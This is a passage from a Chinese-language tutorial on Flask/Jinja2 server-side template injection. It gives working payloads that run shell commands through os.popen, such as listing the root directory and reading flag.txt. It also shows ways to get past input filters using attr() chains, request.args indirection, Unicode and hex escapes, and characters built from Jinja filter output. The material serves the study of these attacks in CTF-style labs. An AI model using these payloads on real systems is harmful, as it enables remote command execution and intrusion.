{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(77)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&#34;os&#34;).popen(&#39;ls /&#39;).read()</code></pre><p>相当于：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__base__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">77</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;__builtins__&#39;</span>][<span style="color:#a6be9d">&#39;eval&#39;</span>](<span style="color:#a6be9d">&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span>)}}</span></span></code></pre></div><h3 id="配合unicode编码绕过很多过滤" class="heading-element"><span>配合Unicode编码绕过很多过滤</span>
  <a href="#%e9%85%8d%e5%90%88unicode%e7%bc%96%e7%a0%81%e7%bb%95%e8%bf%87%e5%be%88%e5%a4%9a%e8%bf%87%e6%bb%a4" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6be9d">&#39;  request  {{  _  %20(空格)  [  ]  .  __globals__   __getitem__</span></span></span></code></pre></div><p>我们用 <code>{%...%}</code>绕过对 <code>{{</code> 的过滤，用<code>|attr()</code>绕过<code>.</code>，并用unicode绕过对关键字的过滤，然后<code>__getitem__</code>绕过中括号。</p>
<p>如下，后面的命令其实也可以换掉，但是没过滤，就先不换了：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f</span><span style="color:#a6be9d">&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f</span><span style="color:#a6be9d">&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f</span><span style="color:#a6be9d">&#34;</span>)()<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f</span><span style="color:#a6be9d">&#34;</span>)(<span style="color:#a6be9d">77</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f</span><span style="color:#a6be9d">&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f</span><span style="color:#a6be9d">&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f</span><span style="color:#a6be9d">&#34;</span>)(<span style="color:#a6be9d">&#34;os&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;popen&#34;</span>)(<span style="color:#a6be9d">&#34;ls&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;read&#34;</span>)()}}</span></span></code></pre></div><p>等同于：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__base__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">77</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;os&#39;</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">popen</span>(<span style="color:#a6be9d">&#39;ls&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()}}</span></span></code></pre></div><h3 id="配合hex编码绕过很多过滤" class="heading-element"><span>配合Hex编码绕过很多过滤</span>
  <a href="#%e9%85%8d%e5%90%88hex%e7%bc%96%e7%a0%81%e7%bb%95%e8%bf%87%e5%be%88%e5%a4%9a%e8%bf%87%e6%bb%a4" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>和上面Unicode的环境一样，方法也一样，就是换了种编码</p>
<p>如下</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f</span><span style="color:#a6be9d">&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\x5f\x5f\x62\x61\x73\x65\x5f\x5f</span><span style="color:#a6be9d">&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f</span><span style="color:#a6be9d">&#34;</span>)()<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f</span><span style="color:#a6be9d">&#34;</span>)(<span style="color:#a6be9d">258</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\x5f\x5f\x69\x6e\x69\x74\x5f\x5f</span><span style="color:#a6be9d">&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f</span><span style="color:#a6be9d">&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f</span><span style="color:#a6be9d">&#34;</span>)(<span style="color:#a6be9d">&#34;os&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;popen&#34;</span>)(<span style="color:#a6be9d">&#34;cat</span><span style="color:#a6be9d">\x20\x66\x6c\x61\x67\x2e\x74\x78\x74</span><span style="color:#a6be9d">&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;read&#34;</span>)()}}</span></span></code></pre></div><p>等同于：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__class__&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__base__&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__subclasses__&#34;</span>)()<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__getitem__&#34;</span>)(<span style="color:#a6be9d">77</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__init__&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__globals__&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__getitem__&#34;</span>)(<span style="color:#a6be9d">&#34;os&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;popen&#34;</span>)(<span style="color:#a6be9d">&#34;ls&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;read&#34;</span>)()}}</span></span></code></pre></div><p>大家可以发现这几种方法中都用到了<code>|attr()</code>，前面也说过，这是 JinJa 的一种过滤器，下面我们可以详细了解一下 JinJa 的过滤器，以便我们加深对绕过的理解，以及研究以后新的绕过。</p>
<h2 id="使用-jinja-的过滤器进行bypass" class="heading-element"><span>使用 JinJa 的过滤器进行Bypass</span>
  <a href="#%e4%bd%bf%e7%94%a8-jinja-%e7%9a%84%e8%bf%87%e6%bb%a4%e5%99%a8%e8%bf%9b%e8%a1%8cbypass" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>在<code>Flask JinJa</code>中内置有很多过滤器可以使用，前文的<code>attr()</code>就是其中的一个过滤器。变量可以通过过滤器进行修改，过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数，也可以没有参数，过滤器函数可以带括号也可以不带括号。可以使用管道符号（|）连接多个过滤器，一个过滤器的输出应用于下一个过滤器。</p>
<p>详情请看官方文档：https://jinja.palletsprojects.com/en/master/templates/#builtin-filters</p>
<p>以下是内置的所有的过滤器列表：</p>
<table>
<thead>
<tr>
<th style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#abs"target="_blank" rel="external nofollow noopener noreferrer"><code>abs()</code></a></th>
<th style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#float"target="_blank" rel="external nofollow noopener noreferrer"><code>float()</code></a></th>
<th style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#lower"target="_blank" rel="external nofollow noopener noreferrer"><code>lower()</code></a></th>
<th style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#round"target="_blank" rel="external nofollow noopener noreferrer"><code>round()</code></a></th>
<th style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#tojson"target="_blank" rel="external nofollow noopener noreferrer"><code>tojson()</code></a></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#attr"target="_blank" rel="external nofollow noopener noreferrer"><code>attr()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#forceescape"target="_blank" rel="external nofollow noopener noreferrer"><code>forceescape()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#map"target="_blank" rel="external nofollow noopener noreferrer"><code>map()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#safe"target="_blank" rel="external nofollow noopener noreferrer"><code>safe()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#trim"target="_blank" rel="external nofollow noopener noreferrer"><code>trim()</code></a></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#batch"target="_blank" rel="external nofollow noopener noreferrer"><code>batch()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#format"target="_blank" rel="external nofollow noopener noreferrer"><code>format()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#max"target="_blank" rel="external nofollow noopener noreferrer"><code>max()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#select"target="_blank" rel="external nofollow noopener noreferrer"><code>select()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#truncate"target="_blank" rel="external nofollow noopener noreferrer"><code>truncate()</code></a></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#capitalize"target="_blank" rel="external nofollow noopener noreferrer"><code>capitalize()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#groupby"target="_blank" rel="external nofollow noopener noreferrer"><code>groupby()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#min"target="_blank" rel="external nofollow noopener noreferrer"><code>min()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#selectattr"target="_blank" rel="external nofollow noopener noreferrer"><code>selectattr()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#unique"target="_blank" rel="external nofollow noopener noreferrer"><code>unique()</code></a></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#center"target="_blank" rel="external nofollow noopener noreferrer"><code>center()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#indent"target="_blank" rel="external nofollow noopener noreferrer"><code>indent()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#pprint"target="_blank" rel="external nofollow noopener noreferrer"><code>pprint()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#slice"target="_blank" rel="external nofollow noopener noreferrer"><code>slice()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#upper"target="_blank" rel="external nofollow noopener noreferrer"><code>upper()</code></a></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#default"target="_blank" rel="external nofollow noopener noreferrer"><code>default()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#int"target="_blank" rel="external nofollow noopener noreferrer"><code>int()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#random"target="_blank" rel="external nofollow noopener noreferrer"><code>random()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#sort"target="_blank" rel="external nofollow noopener noreferrer"><code>sort()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#urlencode"target="_blank" rel="external nofollow noopener noreferrer"><code>urlencode()</code></a></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#dictsort"target="_blank" rel="external nofollow noopener noreferrer"><code>dictsort()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#join"target="_blank" rel="external nofollow noopener noreferrer"><code>join()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#reject"target="_blank" rel="external nofollow noopener noreferrer"><code>reject()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#string"target="_blank" rel="external nofollow noopener noreferrer"><code>string()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#urlize"target="_blank" rel="external nofollow noopener noreferrer"><code>urlize()</code></a></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#escape"target="_blank" rel="external nofollow noopener noreferrer"><code>escape()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#last"target="_blank" rel="external nofollow noopener noreferrer"><code>last()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#rejectattr"target="_blank" rel="external nofollow noopener noreferrer"><code>rejectattr()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#striptags"target="_blank" rel="external nofollow noopener noreferrer"><code>striptags()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#wordcount"target="_blank" rel="external nofollow noopener noreferrer"><code>wordcount()</code></a></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#filesizeformat"target="_blank" rel="external nofollow noopener noreferrer"><code>filesizeformat()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#length"target="_blank" rel="external nofollow noopener noreferrer"><code>length()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#replace"target="_blank" rel="external nofollow noopener noreferrer"><code>replace()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#sum"target="_blank" rel="external nofollow noopener noreferrer"><code>sum()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#wordwrap"target="_blank" rel="external nofollow noopener noreferrer"><code>wordwrap()</code></a></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#first"target="_blank" rel="external nofollow noopener noreferrer"><code>first()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#list"target="_blank" rel="external nofollow noopener noreferrer"><code>list()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#reverse"target="_blank" rel="external nofollow noopener noreferrer"><code>reverse()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#title"target="_blank" rel="external nofollow noopener noreferrer"><code>title()</code></a></td>
<td style="text-align:left"><a href="https://jinja.palletsprojects.com/en/master/templates/#xmlattr"target="_blank" rel="external nofollow noopener noreferrer"><code>xmlattr()</code></a></td>
</tr>
</tbody>
</table>
<p>可以自行点击每个过滤器去查看每一种过滤器的作用。我们就是利用这些过滤器，一步步的拼接出我们想要的字符、数字或字符串。</p>
<h3 id="常用字符获取入口点" class="heading-element"><span>常用字符获取入口点</span>
  <a href="#%e5%b8%b8%e7%94%a8%e5%ad%97%e7%ac%a6%e8%8e%b7%e5%8f%96%e5%85%a5%e5%8f%a3%e7%82%b9" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><ul>
<li>于获取一般字符的方法有以下几种：</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">org</span> <span style="color:#ff636f">=</span> ({ }<span style="color:#ff636f">|</span><span style="color:#58a1dd">select</span>()<span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>()) <span style="color:#ff636f">%</span>}{{<span style="color:#58a1dd">org</span>}} {<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">org</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">self</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>()) <span style="color:#ff636f">%</span>}{{<span style="color:#58a1dd">org</span>}} {<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">org</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">self</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">urlencode</span> <span style="color:#ff636f">%</span>}{{<span style="color:#58a1dd">org</span>}} {<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">org</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">app</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__doc__</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>) <span style="color:#ff636f">%</span>}{{<span style="color:#58a1dd">org</span>}} 
</span></span></code></pre></div><p>如下演示：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">org</span> <span style="color:#ff636f">=</span> ({ }<span style="color:#ff636f">|</span><span style="color:#58a1dd">select</span>()<span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>()) <span style="color:#ff636f">%</span>}{{<span style="color:#58a1dd">org</span>}}</span></span></code></pre></div><p><img loading="lazy" src="https://shs3.b.qianxin.com/attack_forum/2022/03/attach-4460ffd9da758f379e1d5602910e8d07898434a1.png" alt="image.png" srcset="https://shs3.b.qianxin.com/attack_forum/2022/03/attach-4460ffd9da758f379e1d5602910e8d07898434a1.png?size=small, https://shs3.b.qianxin.com/attack_forum/2022/03/attach-4460ffd9da758f379e1d5602910e8d07898434a1.png?size=medium 1.5x, https://shs3.b.qianxin.com/attack_forum/2022/03/attach-4460ffd9da758f379e1d5602910e8d07898434a1.png?size=large 2x" data-title="image.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>如上图所示，我们可以通过 <code>&lt;generator object select_or_reject at 0x7fe339298fc0&gt;</code> 字符串获取的字符有：尖号、空格、下划线，以及各种字母和数字。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">org</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">self</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>()) <span style="color:#ff636f">%</span>}{{<span style="color:#58a1dd">org</span>}}</span></span></code></pre></div><p><img loading="lazy" src="https://shs3.b.qianxin.com/attack_forum/2022/03/attach-877701bea2529dc3fa7caf8bc3e55f19052026b7.png" alt="image.png" srcset="https://shs3.b.qianxin.com/attack_forum/2022/03/attach-877701bea2529dc3fa7caf8bc3e55f19052026b7.png?size=small, https://shs3.b.qianxin.com/attack_forum/2022/03/attach-877701bea2529dc3fa7caf8bc3e55f19052026b7.png?size=medium 1.5x, https://shs3.b.qianxin.com/attack_forum/2022/03/attach-877701bea2529dc3fa7caf8bc3e55f19052026b7.png?size=large 2x" data-title="image.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>可以通过 <code>&lt;TemplateReference None&gt;</code> 字符串获取的字符有：尖号、字母和空格以及各种字母。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">org</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">self</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">urlencode</span> <span style="color:#ff636f">%</span>}{{<span style="color:#58a1dd">org</span>}}</span></span></code></pre></div><p><img loading="lazy" src="https://shs3.b.qianxin.com/attack_forum/2022/03/attach-302ba69511ea5bfe8091bdb84d66b0ce2038f933.png" alt="image.png" srcset="https://shs3.b.qianxin.com/attack_forum/2022/03/attach-302ba69511ea5bfe8091bdb84d66b0ce2038f933.png?size=small, https://shs3.b.qianxin.com/attack_forum/2022/03/attach-302ba69511ea5bfe8091bdb84d66b0ce2038f933.png?size=medium 1.5x, https://shs3.b.qianxin.com/attack_forum/2022/03/attach-302ba69511ea5bfe8091bdb84d66b0ce2038f933.png?size=large 2x" data-title="image.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>如上图所示，可以获得的字符除了字母以外还有百分号，这一点比较重要，因为如果我们控制了百分号的话我们可以获取任意字符（URL）。</p>
